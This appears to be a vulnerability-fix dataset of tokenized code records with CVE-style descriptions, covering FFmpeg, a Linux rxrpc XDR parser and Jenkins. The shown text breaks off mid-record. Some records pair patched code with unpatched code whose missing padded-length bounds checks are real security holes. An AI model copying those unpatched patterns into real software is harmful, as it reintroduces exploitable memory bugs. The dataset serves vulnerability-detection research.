{"contents": ["empty"], "code_tokens": ["if", "(", "avctx", "-", ">", "codec", "&", "&", "avctx", "-", ">", "codec", "-", ">", "close", "&", "&</s>if", "(", "avctx", "-", ">", "codec", "&", "&"], "docstring_tokens": ["persuading", "a", "victim", "to", "open", "a", "specially-crafted", "file"]}
{"contents": ["empty"], "code_tokens": ["unsigned", "int", "toklen", "=", "*", "_toklen", ",", "n_parts", ",", "loop", ",", "tmp", ",", "paddedlen", ";", "paddedlen", "=", "(", "tmp", "+", "3", ")", "&", "~", "3", ";", "if", "(", "paddedlen", ">", "toklen", ")", "toklen", "-", "=", "paddedlen", ";", "xdr", "+", "=", "paddedlen", ">", ">", "2", ";", "paddedlen", "=", "(", "tmp", "+", "3", ")", "&", "~", "3", ";", "if", "(", "paddedlen", ">", "toklen", ")", "toklen", "-", "=", "paddedlen", ";", "xdr", "+", "=", "paddedlen", ">", ">", "2", ";", "unsigned", "int", "toklen", "=", "*", "_toklen", ",", "len", ",", "paddedlen", ";", "paddedlen", "=", "(", "len", "+", "3", ")", "&", "~", "3", ";", "if", "(", "paddedlen", ">", "toklen", ")", "return", "-", "EINVAL", ";", "toklen", "-", "=", "paddedlen", ";", "xdr", "+", "=", "paddedlen", ">", ">", "2", ";", "unsigned", "int", "toklen", "=", "*", "_toklen", ",", "len", ",", "paddedlen", ";", "paddedlen", "=", "(", "len", "+", "3", ")", "&", "~", "3", ";", "if", "(", "paddedlen", ">", "toklen", ")", "return", "-", "EINVAL", ";", "toklen", "-", "=", "paddedlen", ";", "xdr", "+", "=", "paddedlen", ">", ">", "2", ";", "unsigned", "int", "len", ",", "paddedlen", ",", "loop", ",", "ntoken", ",", "toklen", ",", "sec_ix", ";", "paddedlen", "=", "(", "len", "+", "3", ")", "&", "~", "3", ";", "if", "(", "paddedlen", ">", "datalen", ")", "for", "(", ";", "loop", "<", "paddedlen", ";", "loop", "+", "+)", "if", "(", "cp", "[", "loop", "]", ")", "goto", "not_xdr", ";", "len", ",", "paddedlen", ",", "len", ",", "len", ",", "(", "const", "char", "*", ")", "xdr", ")", ";", "datalen", "-", "=", "paddedlen", ";", "xdr", "+", "=", "paddedlen", ">", ">", "2", ";", "paddedlen", "=", "(", "toklen", "+", "3", ")", "&", "~", "3", ";", "if", "(", "toklen", "<", "20", "|", "|", "toklen", ">", "datalen", "|", "|", "paddedlen", ">", "datalen", ")", "datalen", "-", "=", "paddedlen", ";", "xdr", "+", "=", "paddedlen", ">", ">", "2", ";</s>unsigned", "int", "toklen", "=", "*", "_toklen", ",", "n_parts", ",", "loop", ",", "tmp", ";", "if", "(", "tmp", ">", "toklen", ")", "tmp", "=", "(", "tmp", "+", "3", ")", "&", "~", "3", ";", "toklen", "-", "=", "tmp", ";", "xdr", "+", "=", "tmp", ">", ">", "2", ";", "if", "(", "tmp", ">", "toklen", ")", "tmp", "=", "(", "tmp", "+", "3", ")", "&", "~", "3", ";", "toklen", "-", "=", "tmp", ";", "xdr", "+", "=", "tmp", ">", ">", "2", ";", "unsigned", "int", "toklen", "=", "*", "_toklen", ",", "len", ";", "len", "=", "(", "len", "+", "3", ")", "&", "~", "3", ";", "toklen", "-", "=", "len", ";", "xdr", "+", "=", "len", ">", ">", "2", ";", "unsigned", "int", "toklen", "=", "*", "_toklen", ",", "len", ";", "len", "=", "(", "len", "+", "3", ")", "&", "~", "3", ";", "toklen", "-", "=", "len", ";", "xdr", "+", "=", "len", ">", ">", "2", ";", "unsigned", "int", "len", ",", "tmp", ",", "loop", ",", "ntoken", ",", "toklen", ",", "sec_ix", ";", "tmp", "=", "(", "len", "+", "3", ")", "&", "~", "3", ";", "if", "(", "tmp", ">", "datalen", ")", "if", "(", "len", "<", "tmp", ")", "for", "(", ";", "loop", "<", "tmp", ";", "loop", "+", "+)", "if", "(", "cp", "[", "loop", "]", ")", "goto", "not_xdr", ";", "len", ",", "tmp", ",", "len", ",", "len", ",", "(", "const", "char", "*", ")", "xdr", ")", ";", "datalen", "-", "=", "tmp", ";", "xdr", "+", "=", "tmp", ">", ">", "2", ";", "if", "(", "toklen", "<", "20", "|", "|", "toklen", ">", "datalen", ")", "datalen", "-", "=", "(", "toklen", "+", "3", ")", "&", "~", "3", ";", "xdr", "+", "=", "(", "toklen", "+", "3", ")", ">", ">", "2", ";"], "docstring_tokens": ["making", "the", "various", "variable-length", "data", "checks", "use", "the", "padded", "length"]}
{"contents": ["empty"], "code_tokens": ["import", "java", ".", "util", ".", "Set", ";", "if", "(", "BREAK_CYCLES", ".", "contains", "(", "yourName", "+", "'", "/'", "+", "shortName", ")", ")", "{", "LOGGER", ".", "log", "(", "Level", ".", "FINE", ",", "\"", "skipping", "implicit", "dependency", "{", "0", "}", "\u2192", "{", "1", "}", "\",", "new", "Object", "[", "]", "{", "yourName", ",", "shortName", "}", ");", "return", ";", "}", "if", "(", "jenkinsVersion", "=", "=", "null", "|", "|", "jenkinsVersion", ".", "equals", "(", "\"", "null", "\"", ")", "|", "|", "new", "VersionNumber", "(", "jenkinsVersion", ")", ".", "compareTo", "(", "splitWhen", ")", "<", "=", "0", ")", "{", "optionalDependencies", ".", "add", "(", "new", "PluginWrapper", ".", "Dependency", "(", "shortName", "+", "'", ":'", "+", "requireVersion", ")", ");", "LOGGER", ".", "log", "(", "Level", ".", "FINE", ",", "\"", "adding", "implicit", "dependency", "{", "0", "}", "\u2192", "{", "1", "}", "because", "of", "{", "2", "}", "\",", "new", "Object", "[", "]", "{", "yourName", ",", "shortName", ",", "jenkinsVersion", "}", ");", "}", "new", "DetachedPlugin", "(", "\"", "antisamy", "-", "markup", "-", "formatter", "\"", ",\"", "1", ".", "553", ".", "*\"", ",\"", "1", ".", "0", "\"", "),", "new", "DetachedPlugin", "(", "\"", "matrix", "-", "project", "\"", ",\"", "1", ".", "561", ".", "*\"", ",\"", "1", ".", "0", "\"", ")", "/", "**", "Implicit", "dependencies", "that", "are", "known", "to", "be", "unnecessary", "and", "which", "must", "be", "cut", "out", "to", "prevent", "a", "dependency", "cycle", "among", "bundled", "plugins", ".", "*", "/", "private", "static", "final", "Set", "<", "String", ">", "BREAK_CYCLES", "=", "new", "HashSet", "<", "String", ">", "(", "Arrays", ".", "asList", "(", "\"", "script", "-", "security", "/", "matrix", "-", "auth", "\"", ",", "\"", "script", "-", "security", "/", "windows", "-", "slaves", "\"", ",", "\"", "script", "-", "security", "/", "antisamy", "-", "markup", "-", "formatter", "\"", ",", "\"", "script", "-", "security", "/", "matrix", "-", "project", "\"", ")", ");", "*", "but", "for", "example", "{", "@", "code", "MatrixBuild", "}", "would", "call", "this", "after", "@", "Deprecated", "return", "o", "!", "=", "null", "&", "&", "o", ".", "getClass", "(", ").", "getName", "(", ").", "equals", "(", "\"", "hudson", ".", "matrix", ".", "MatrixProject", "\"", ");", "*", "This", "mechanism", "is", "used", "by", "{", "@", "code", "MatrixConfiguration", "}", "to", "pass", "public", "class", "ParametersAction", "implements", "Action", ",", "Iterable", "<", "ParameterValue", ">", ",", "QueueAction", ",", "EnvironmentContributingAction", ",", "LabelAssignmentAction", "{", "*", "Ones", "that", "don", "'", "t", "need", "to", "be", "under", "specific", "parent", "(", "say", ",", "unlike", "{", "@", "code", "MatrixConfiguration", "}", "),", "/", "/", "TODO", "is", "this", "harmful", "to", "call", "unconditionally", ",", "so", "it", "would", "apply", "also", "to", "MavenModule", "for", "example", "?", "if", "(", "key", ".", "getClass", "(", ").", "getName", "(", ").", "equals", "(", "\"", "hudson", ".", "matrix", ".", "MatrixConfiguration", "\"", "))", "{", "public", "class", "JUnitResultArchiver", "extends", "Recorder", "{", "*", "<", "li", ">", "Check", "out", "will", "only", "happen", "once", "in", "{", "@", "code", "MatrixBuild", "}", ",", "and", "its", "state", "will", "be", "then", "sent", "*", "to", "{", "@", "code", "MatrixRun", "}", "s", "by", "other", "means", "such", "as", "rsync", ".", "*", "<", "li", ">", "{@", "code", "MatrixBuild", "}", "does", "no", "check", "out", "of", "its", "own", ",", "and", "check", "out", "is", "only", "done", "on", "{", "@", "code", "MatrixRun", "}", "s", "<", "j", ":", "if", "test", "=", "\"$", "{(", "it", ".", "name", "!", "=", "it", ".", "displayName", ")", "and", "(", "it", ".", "class", ".", "name", "!", "='", "hudson", ".", "matrix", ".", "MatrixConfiguration", "'", ")}", "\">", "<", "!-", "-", "TODO", "rather", "check", "for", "TopLevelItem", "(", "how", "to", "do", "this", "from", "Jelly", "?", ")", "-", "->", "/", "*", "*", "/", "<", "matrix", "-", "project", ".", "version", ">", "1", ".", "2", ".", "1", "-", "20150204", ".", "194845", "-", "1", "<", "/", "matrix", "-", "project", ".", "version", ">", "<", "dependency", ">", "<", "groupId", ">", "org", ".", "jenkins", "-", "ci", ".", "plugins", "<", "/", "groupId", ">", "<", "artifactId", ">", "matrix", "-", "project", "<", "/", "artifactId", ">", "<", "version", ">", "${", "matrix", "-", "project", ".", "version", "}", "</", "version", ">", "<", "/", "dependency", ">", "<", "artifactItem", ">", "<", "groupId", ">", "org", ".", "jenkins", "-", "ci", ".", "plugins", "<", "/", "groupId", ">", "<", "artifactId", ">", "matrix", "-", "project", "<", "/", "artifactId", ">", "<", "version", ">", "${", "matrix", "-", "project", ".", "version", "}", "</", "version", ">", "<", "type", ">", "hpi", "<", "/", "type", ">", "<", "/", "artifactItem", ">", "<", "artifactItem", ">", "<", "groupId", ">", "org", ".", "jenkins", "-", "ci", ".", "plugins", "<", "/", "groupId", ">", "<", "artifactId", ">", "script", "-", "security", "<", "/", "artifactId", ">", "<", "version", ">", "1", ".", "13", "<", "/", "version", ">", "<", "type", ">", "hpi", "<", "/", "type", ">", "<", "/", "artifactItem", "></s>if", "(", "jenkinsVersion", "=", "=", "null", "|", "|", "jenkinsVersion", ".", "equals", "(", "\"", "null", "\"", ")", "|", "|", "new", "VersionNumber", "(", "jenkinsVersion", ")", ".", "compareTo", "(", "splitWhen", ")", "<", "=", "0", ")", "optionalDependencies", ".", "add", "(", "new", "PluginWrapper", ".", "Dependency", "(", "shortName", "+", "':", "'+", "requireVersion", ")", ");", "new", "DetachedPlugin", "(", "\"", "antisamy", "-", "markup", "-", "formatter", "\"", ",\"", "1", ".", "553", ".", "*\"", ",\"", "1", ".", "0", "\"", ")", "import", "hudson", ".", "matrix", ".", "MatrixBuild", ";", "import", "hudson", ".", "util", ".", "DirScanner", ".", "Glob", ";", "*", "but", "for", "example", "{", "@", "link", "MatrixBuild", "}", "would", "call", "this", "after", "import", "hudson", ".", "matrix", ".", "MatrixProject", ";", "/", "**", "*", "@", "since", "1", ".", "524", "*", "/", "return", "o", "instanceof", "MatrixProject", ";", "/", "*", "*", "The", "MIT", "License", "*", "*", "Copyright", "(", "c", ")", "2004", "-", "2009", ",", "Sun", "Microsystems", ",", "Inc", ".", ",", "Kohsuke", "Kawaguchi", "*", "*", "Permission", "is", "hereby", "granted", ",", "free", "of", "charge", ",", "to", "any", "person", "obtaining", "a", "copy", "*", "of", "this", "software", "and", "associated", "documentation", "files", "(", "the", "\"", "Software", "\"", "),", "to", "deal", "*", "in", "the", "Software", "without", "restriction", ",", "including", "without", "limitation", "the", "rights", "*", "to", "use", ",", "copy", ",", "modify", ",", "merge", ",", "publish", ",", "distribute", ",", "sublicense", ",", "and", "/", "or", "sell", "*", "copies", "of", "the", "Software", ",", "and", "to", "permit", "persons", "to", "whom", "the", "Software", "is", "*", "furnished", "to", "do", "so", ",", "subject", "to", "the", "following", "conditions", ":", "*", "*", "The", "above", "copyright", "notice", "and", "this", "permission", "notice", "shall", "be", "included", "in", "*", "all", "copies", "or", "substantial", "portions", "of", "the", "Software", ".", "*", "*", "THE", "SOFTWARE", "IS", "PROVIDED", "\"", "AS", "IS", "\"", ",", "WITHOUT", "WARRANTY", "OF", "ANY", "KIND", ",", "EXPRESS", "OR", "*", "IMPLIED", ",", "INCLUDING", "BUT", "NOT", "LIMITED", "TO", "THE", "WARRANTIES", "OF", "MERCHANTABILITY", ",", "*", "FITNESS", "FOR", "A", "PARTICULAR", "PURPOSE", "AND", "NONINFRINGEMENT", ".", "IN", "NO", "EVENT", "SHALL", "THE", "*", "AUTHORS", "OR", "COPYRIGHT", "HOLDERS", "BE", "LIABLE", "FOR", "ANY", "CLAIM", ",", "DAMAGES", "OR", "OTHER", "*", "LIABILITY", ",", "WHETHER", "IN", "AN", "ACTION", "OF", "CONTRACT", ",", "TORT", "OR", "OTHERWISE", ",", "ARISING", "FROM", ",", "*", "OUT", "OF", "OR", "IN", "CONNECTION", "WITH", "THE", "SOFTWARE", "OR", "THE", "USE", "OR", "OTHER", "DEALINGS", "IN", "*", "THE", "SOFTWARE", ".", "*", "/", "package", "hudson", ".", "matrix", ";", "import", "hudson", ".", "DescriptorExtensionList", ";", "import", "hudson", ".", "ExtensionPoint", ";", "import", "hudson", ".", "RestrictedSince", ";", "import", "hudson", ".", "Util", ";", "import", "hudson", ".", "matrix", ".", "MatrixBuild", ".", "MatrixBuildExecution", ";", "import", "hudson", ".", "model", ".", "AbstractDescribableImpl", ";", "import", "jenkins", ".", "model", ".", "Jenkins", ";", "import", "hudson", ".", "util", ".", "QuotedStringTokenizer", ";", "import", "org", ".", "kohsuke", ".", "accmod", ".", "Restricted", ";", "import", "org", ".", "kohsuke", ".", "accmod", ".", "restrictions", ".", "NoExternalUse", ";", "import", "org", ".", "kohsuke", ".", "stapler", ".", "StaplerRequest", ";", "import", "org", ".", "kohsuke", ".", "stapler", ".", "DataBoundConstructor", ";", "import", "java", ".", "util", ".", "ArrayList", ";", "import", "java", ".", "util", ".", "Collections", ";", "import", "java", ".", "util", ".", "Enumeration", ";", "import", "java", ".", "util", ".", "Iterator", ";", "import", "java", ".", "util", ".", "List", ";", "import", "java", ".", "util", ".", "Arrays", ";", "import", "java", ".", "util", ".", "Map", ";", "/", "**", "*", "Configuration", "axis", ".", "*", "*", "<", "p", ">", "*", "This", "class", "represents", "a", "single", "dimension", "of", "the", "configuration", "matrix", ".", "*", "For", "example", ",", "the", "JAX", "-", "WS", "RI", "test", "configuration", "might", "include", "*", "one", "axis", "\"", "container", "=", "{", "glassfish", ",", "tomcat", ",", "jetty", "}", "\"", "and", "another", "axis", "*", "\"", "stax", "=", "{", "sjsxp", ",", "woodstox", "}", "\",", "and", "so", "on", ".", "*", "*", "@", "author", "Kohsuke", "Kawaguchi", "*", "/", "public", "class", "Axis", "extends", "AbstractDescribableImpl", "<", "Axis", ">", "implements", "Comparable", "<", "Axis", ">", ",", "Iterable", "<", "String", ">", ",", "ExtensionPoint", "{", "/", "**", "*", "Name", "of", "this", "axis", ".", "*", "Used", "as", "a", "variable", "name", ".", "*", "*", "@", "deprecated", "as", "of", "1", ".", "373", "*", "Use", "{", "@", "link", "#", "getName", "(", ")}", "*", "/", "public", "final", "String", "name", ";", "/", "**", "*", "Possible", "values", "for", "this", "axis", ".", "*", "*", "@", "deprecated", "as", "of", "1", ".", "373", "*", "Use", "{", "@", "link", "#", "getValues", "(", ")}", "*", "/", "@", "Restricted", "(", "NoExternalUse", ".", "class", ")", "@", "RestrictedSince", "(", "\"", "1", ".", "463", "\"", ")", "public", "final", "List", "<", "String", ">", "values", ";", "public", "Axis", "(", "String", "name", ",", "List", "<", "String", ">", "values", ")", "{", "if", "(", "values", "=", "=", "null", "|", "|", "values", ".", "isEmpty", "(", "))", "{", "values", "=", "Collections", ".", "emptyList", "(", ");", "}", "this", ".", "name", "=", "name", ";", "this", ".", "values", "=", "new", "ArrayList", "<", "String", ">", "(", "values", ")", ";", "}", "public", "Axis", "(", "String", "name", ",", "String", ".", "..", "values", ")", "{", "this", "(", "name", ",", "Arrays", ".", "asList", "(", "values", ")", ");", "}", "/", "**", "*", "Used", "to", "build", "{", "@", "link", "Axis", "}", "from", "form", ".", "*", "*", "Axis", "with", "empty", "values", "need", "to", "be", "removed", "later", ".", "*", "/", "@", "DataBoundConstructor", "public", "Axis", "(", "String", "name", ",", "String", "valueString", ")", "{", "this", ".", "name", "=", "name", ";", "this", ".", "values", "=", "new", "ArrayList", "<", "String", ">", "(", "Arrays", ".", "asList", "(", "Util", ".", "tokenize", "(", "valueString", ")", "))", ";", "}", "/", "**", "*", "Returns", "true", "if", "this", "axis", "is", "a", "system", "-", "reserved", "axis", "*", "that", "<", "strike", ">", "has", "<", "/", "strike", ">", "used", "to", "have", "af", "special", "treatment", ".", "*", "*", "@", "deprecated", "as", "of", "1", ".", "373", "*", "System", "vs", "user", "difference", "are", "generalized", "into", "extension", "point", ".", "*", "/", "public", "boolean", "isSystem", "(", ")", "{", "return", "false", ";", "}", "public", "Iterator", "<", "String", ">", "iterator", "(", ")", "{", "return", "getValues", "(", ").", "iterator", "(", ");", "}", "public", "int", "size", "(", ")", "{", "return", "getValues", "(", ").", "size", "(", ");", "}", "public", "String", "value", "(", "int", "index", ")", "{", "return", "getValues", "(", ").", "get", "(", "index", ")", ";", "}", "/", "**", "*", "The", "inverse", "of", "{", "@", "link", "#", "value", "(", "int", ")", "}.", "*", "/", "public", "int", "indexOf", "(", "String", "value", ")", "{", "return", "values", ".", "indexOf", "(", "value", ")", ";", "}", "/", "**", "*", "Axis", "is", "fully", "ordered", "so", "that", "we", "can", "convert", "between", "a", "list", "of", "axis", "*", "and", "a", "string", "unambiguously", ".", "*", "/", "public", "int", "compareTo", "(", "Axis", "that", ")", "{", "return", "this", ".", "name", ".", "compareTo", "(", "that", ".", "name", ")", ";", "}", "/", "**", "*", "Name", "of", "this", "axis", ".", "*", "Used", "as", "a", "variable", "name", ".", "*", "/", "public", "String", "getName", "(", ")", "{", "return", "name", ";", "}", "/", "**", "*", "Possible", "values", "for", "this", "axis", ".", "*", "/", "public", "List", "<", "String", ">", "getValues", "(", ")", "{", "return", "Collections", ".", "unmodifiableList", "(", "values", ")", ";", "}", "/", "**", "*", "Called", "right", "at", "the", "beginning", "of", "{", "@", "link", "MatrixBuild", "}", "execution", "to", "allow", "{", "@", "link", "Axis", "}", "to", "update", "{", "@", "link", "#", "values", "}", "*", "based", "on", "the", "current", "build", ".", "*", "*", "<", "p", ">", "*", "Historically", ",", "axes", "values", "are", "considered", "static", ".", "They", "were", "assumed", "to", "reflect", "what", "the", "user", "has", "typed", "in", ",", "*", "and", "their", "values", "are", "changed", "only", "when", "the", "project", "is", "reconfigured", ".", "So", "abstractions", "are", "built", "around", "this", "*", "notion", ",", "and", "so", "for", "example", "{", "@", "link", "MatrixProject", "}", "has", "the", "current", "axes", "and", "their", "values", ",", "which", "it", "uses", "*", "to", "render", "its", "UI", ".", "*", "*", "<", "p", ">", "*", "So", "when", "the", "need", "was", "identified", "to", "change", "the", "values", "of", "axes", "per", "build", ",", "we", "decided", "that", "this", "be", "represented", "*", "as", "a", "kind", "of", "project", "configuration", "update", "(", "where", "a", "project", "gets", "reconfigured", "every", "time", "a", "build", "runs", ")", ",", "and", "*", "this", "call", "back", "was", "added", "to", "allow", "{", "@", "link", "Axis", "}", "to", "update", "the", "next", "return", "value", "from", "the", "{", "@", "link", "#", "getValues", "(", ")}", "*", "(", "which", "is", "typically", "done", "by", "updating", "{", "@", "link", "#", "values", "}", ".)", "*", "*", "<", "p", ">", "*", "While", "it", "is", "not", "strictly", "required", ",", "because", "of", "these", "historical", "reasons", ",", "UI", "will", "look", "better", "if", "*", "Future", "calls", "to", "{", "@", "link", "Axis", "#", "getValues", "(", ")}", "return", "the", "same", "values", "as", "what", "this", "method", "returns", "(", "until", "*", "the", "next", "rebuild", "call", ")", ".", "*", "*", "@", "param", "context", "*", "The", "ongoing", "build", ".", "Never", "null", ".", "*", "@", "return", "*", "Never", "null", ".", "Returns", "the", "updated", "set", "of", "values", ".", "*", "@", "since", "1", ".", "471", "*", "/", "public", "List", "<", "String", ">", "rebuild", "(", "MatrixBuildExecution", "context", ")", "{", "return", "getValues", "(", ");", "}", "@", "Override", "public", "AxisDescriptor", "getDescriptor", "(", ")", "{", "return", "(", "AxisDescriptor", ")", "super", ".", "getDescriptor", "(", ");", "}", "@", "Override", "public", "String", "toString", "(", ")", "{", "return", "new", "StringBuilder", "(", ").", "append", "(", "name", ")", ".", "append", "(", "\"=", "{\"", ").", "append", "(", "Util", ".", "join", "(", "values", ",", "\",", "\")", ").", "append", "(", "'}", "')", ".", "toString", "(", ");", "}", "/", "**", "*", "Used", "for", "generating", "the", "config", "UI", ".", "*", "If", "the", "axis", "is", "big", "and", "occupies", "a", "lot", "of", "space", ",", "use", "newline", "for", "separator", "*", "to", "display", "multi", "-", "line", "text", ".", "*", "/", "public", "String", "getValueString", "(", ")", "{", "int", "len", "=", "0", ";", "for", "(", "String", "value", ":", "values", ")", "len", "+", "=", "value", ".", "length", "(", ");", "char", "delim", "=", "len", ">", "30", "?", "'", "\\", "n", "'", ":", "'", "'", ";", "/", "/", "Build", "string", "connected", "with", "delimiter", ",", "quoting", "as", "needed", "StringBuilder", "buf", "=", "new", "StringBuilder", "(", "len", "+", "values", ".", "size", "(", ")*", "3", ")", ";", "for", "(", "String", "value", ":", "values", ")", "buf", ".", "append", "(", "delim", ")", ".", "append", "(", "QuotedStringTokenizer", ".", "quote", "(", "value", ",", "\"\"", "))", ";", "return", "buf", ".", "substring", "(", "1", ")", ";", "}", "/", "**", "*", "Parses", "the", "submitted", "form", "(", "where", "possible", "values", "are", "*", "presented", "as", "a", "list", "of", "checkboxes", ")", "and", "creates", "an", "axis", "*", "/", "public", "static", "Axis", "parsePrefixed", "(", "StaplerRequest", "req", ",", "String", "name", ")", "{", "List", "<", "String", ">", "values", "=", "new", "ArrayList", "<", "String", ">", "()", ";", "String", "prefix", "=", "name", "+", "'.", "';", "Enumeration", "e", "=", "req", ".", "getParameterNames", "(", ");", "while", "(", "e", ".", "hasMoreElements", "(", "))", "{", "String", "paramName", "=", "(", "String", ")", "e", ".", "nextElement", "(", ");", "if", "(", "paramName", ".", "startsWith", "(", "prefix", ")", ")", "values", ".", "add", "(", "paramName", ".", "substring", "(", "prefix", ".", "length", "(", "))", ");", "}", "if", "(", "values", ".", "isEmpty", "(", "))", "return", "null", ";", "return", "new", "Axis", "(", "name", ",", "values", ")", ";", "}", "/", "**", "*", "Previously", "we", "used", "to", "persist", "{", "@", "link", "Axis", "}", ",", "but", "now", "those", "are", "divided", "into", "subtypes", ".", "*", "So", "upon", "deserialization", ",", "resolve", "to", "the", "proper", "type", ".", "*", "/", "public", "Object", "readResolve", "(", ")", "{", "if", "(", "getClass", "(", ")!", "=", "Axis", ".", "class", ")", "return", "this", ";", "/", "*", "This", "method", "is", "necessary", "only", "because", "earlier", "versions", "of", "Jenkins", "treated", "axis", "names", "\"", "label", "\"", "and", "\"", "jdk", "\"", "differently", ",", "plus", "Axis", "was", "a", "concrete", "class", ",", "and", "we", "need", "to", "be", "able", "to", "read", "that", "back", ".", "So", "this", "measure", "is", "not", "needed", "for", "newly", "added", "Axes", ".", "*", "/", "if", "(", "getName", "(", ").", "equals", "(", "\"", "jdk", "\"", "))", "return", "new", "JDKAxis", "(", "getValues", "(", "))", ";", "if", "(", "getName", "(", ").", "equals", "(", "\"", "label", "\"", "))", "return", "new", "LabelAxis", "(", "getName", "(", "),", "getValues", "(", "))", ";", "return", "new", "TextAxis", "(", "getName", "(", "),", "getValues", "(", "))", ";", "}", "/", "**", "*", "Returns", "all", "the", "registered", "{", "@", "link", "AxisDescriptor", "}", "s", ".", "*", "/", "public", "static", "DescriptorExtensionList", "<", "Axis", ",", "AxisDescriptor", ">", "all", "(", ")", "{", "return", "Jenkins", ".", "getInstance", "(", ").", "<", "Axis", ",", "AxisDescriptor", ">", "getDescriptorList", "(", "Axis", ".", "class", ")", ";", "}", "/", "**", "*", "Converts", "the", "selected", "value", "(", "which", "is", "among", "{", "@", "link", "#", "values", "}", ")", "and", "adds", "that", "to", "the", "given", "map", ",", "*", "which", "serves", "as", "the", "build", "variables", ".", "*", "/", "public", "void", "addBuildVariable", "(", "String", "value", ",", "Map", "<", "String", ",", "String", ">", "map", ")", "{", "map", ".", "put", "(", "name", ",", "value", ")", ";", "}", "}", "@", "@", "-", "1", ",", "67", "+", "0", ",", "0", "@", "@", "/", "*", "*", "The", "MIT", "License", "*", "*", "Copyright", "(", "c", ")", "2010", ",", "InfraDNA", ",", "Inc", ".", "*", "*", "Permission", "is", "hereby", "granted", ",", "free", "of", "charge", ",", "to", "any", "person", "obtaining", "a", "copy", "*", "of", "this", "software", "and", "associated", "documentation", "files", "(", "the", "\"", "Software", "\"", "),", "to", "deal", "*", "in", "the", "Software", "without", "restriction", ",", "including", "without", "limitation", "the", "rights", "*", "to", "use", ",", "copy", ",", "modify", ",", "merge", ",", "publish", ",", "distribute", ",", "sublicense", ",", "and", "/", "or", "sell", "*", "copies", "of", "the", "Software", ",", "and", "to", "permit", "persons", "to", "whom", "the", "Software", "is", "*", "furnished", "to", "do", "so", ",", "subject", "to", "the", "following", "conditions", ":", "*", "*", "The", "above", "copyright", "notice", "and", "this", "permission", "notice", "shall", "be", "included", "in", "*", "all", "copies", "or", "substantial", "portions", "of", "the", "Software", ".", "*", "*", "THE", "SOFTWARE", "IS", "PROVIDED", "\"", "AS", "IS", "\"", ",", "WITHOUT", "WARRANTY", "OF", "ANY", "KIND", ",", "EXPRESS", "OR", "*", "IMPLIED", ",", "INCLUDING", "BUT", "NOT", "LIMITED", "TO", "THE", "WARRANTIES", "OF", "MERCHANTABILITY", ",", "*", "FITNESS", "FOR", "A", "PARTICULAR", "PURPOSE", "AND", "NONINFRINGEMENT", ".", "IN", "NO", "EVENT", "SHALL", "THE", "*", "AUTHORS", "OR", "COPYRIGHT", "HOLDERS", "BE", "LIABLE", "FOR", "ANY", "CLAIM", ",", "DAMAGES", "OR", "OTHER", "*", "LIABILITY", ",", "WHETHER", "IN", "AN", "ACTION", "OF", "CONTRACT", ",", "TORT", "OR", "OTHERWISE", ",", "ARISING", "FROM", ",", "*", "OUT", "OF", "OR", "IN", "CONNECTION", "WITH", "THE", "SOFTWARE", "OR", "THE", "USE", "OR", "OTHER", "DEALINGS", "IN", "*", "THE", "SOFTWARE", ".", "*", "/", "package", "hudson", ".", "matrix", ";", "import", "hudson", ".", "Util", ";", "import", "hudson", ".", "model", ".", "Descriptor", ";", "import", "hudson", ".", "model", ".", "Failure", ";", "import", "jenkins", ".", "model", ".", "Jenkins", ";", "import", "hudson", ".", "util", ".", "FormValidation", ";", "import", "org", ".", "kohsuke", ".", "stapler", ".", "QueryParameter", ";", "/", "**", "*", "{", "@", "link", "Descriptor", "}", "for", "{", "@", "link", "Axis", "}", "*", "*", "@", "author", "Kohsuke", "Kawaguchi", "*", "/", "public", "abstract", "class", "AxisDescriptor", "extends", "Descriptor", "<", "Axis", ">", "{", "protected", "AxisDescriptor", "(", "Class", "<", "?", "extends", "Axis", ">", "clazz", ")", "{", "super", "(", "clazz", ")", ";", "}", "protected", "AxisDescriptor", "(", ")", "{", "}", "/", "**", "*", "Return", "false", "if", "the", "user", "shouldn", "'", "t", "be", "able", "to", "create", "thie", "axis", "from", "the", "UI", ".", "*", "/", "public", "boolean", "isInstantiable", "(", ")", "{", "return", "true", ";", "}", "/", "**", "*", "Makes", "sure", "that", "the", "given", "name", "is", "good", "as", "a", "axis", "name", ".", "*", "/", "public", "FormValidation", "doCheckName", "(", "@", "QueryParameter", "String", "value", ")", "{", "if", "(", "Util", ".", "fixEmpty", "(", "value", ")", "==", "null", ")", "return", "FormValidation", ".", "ok", "(", ");", "try", "{", "Jenkins", ".", "checkGoodName", "(", "value", ")", ";", "return", "FormValidation", ".", "ok", "(", ");", "}", "catch", "(", "Failure", "e", ")", "{", "return", "FormValidation", ".", "error", "(", "e", ".", "getMessage", "(", "))", ";", "}", "}", "}", "@", "@", "-", "1", ",", "108", "+", "0", ",", "0", "@", "@", "/", "*", "*", "The", "MIT", "License", "*", "*", "Copyright", "(", "c", ")", "2004", "-", "2010", ",", "Sun", "Microsystems", ",", "Inc", ".", ",", "Kohsuke", "Kawaguchi", "*", "*", "Permission", "is", "hereby", "granted", ",", "free", "of", "charge", ",", "to", "any", "person", "obtaining", "a", "copy", "*", "of", "this", "software", "and", "associated", "documentation", "files", "(", "the", "\"", "Software", "\"", "),", "to", "deal", "*", "in", "the", "Software", "without", "restriction", ",", "including", "without", "limitation", "the", "rights", "*", "to", "use", ",", "copy", ",", "modify", ",", "merge", ",", "publish", ",", "distribute", ",", "sublicense", ",", "and", "/", "or", "sell", "*", "copies", "of", "the", "Software", ",", "and", "to", "permit", "persons", "to", "whom", "the", "Software", "is", "*", "furnished", "to", "do", "so", ",", "subject", "to", "the", "following", "conditions", ":", "*", "*", "The", "above", "copyright", "notice", "and", "this", "permission", "notice", "shall", "be", "included", "in", "*", "all", "copies", "or", "substantial", "portions", "of", "the", "Software", ".", "*", "*", "THE", "SOFTWARE", "IS", "PROVIDED", "\"", "AS", "IS", "\"", ",", "WITHOUT", "WARRANTY", "OF", "ANY", "KIND", ",", "EXPRESS", "OR", "*", "IMPLIED", ",", "INCLUDING", "BUT", "NOT", "LIMITED", "TO", "THE", "WARRANTIES", "OF", "MERCHANTABILITY", ",", "*", "FITNESS", "FOR", "A", "PARTICULAR", "PURPOSE", "AND", "NONINFRINGEMENT", ".", "IN", "NO", "EVENT", "SHALL", "THE", "*", "AUTHORS", "OR", "COPYRIGHT", "HOLDERS", "BE", "LIABLE", "FOR", "ANY", "CLAIM", ",", "DAMAGES", "OR", "OTHER", "*", "LIABILITY", ",", "WHETHER", "IN", "AN", "ACTION", "OF", "CONTRACT", ",", "TORT", "OR", "OTHERWISE", ",", "ARISING", "FROM", ",", "*", "OUT", "OF", "OR", "IN", "CONNECTION", "WITH", "THE", "SOFTWARE", "OR", "THE", "USE", "OR", "OTHER", "DEALINGS", "IN", "*", "THE", "SOFTWARE", ".", 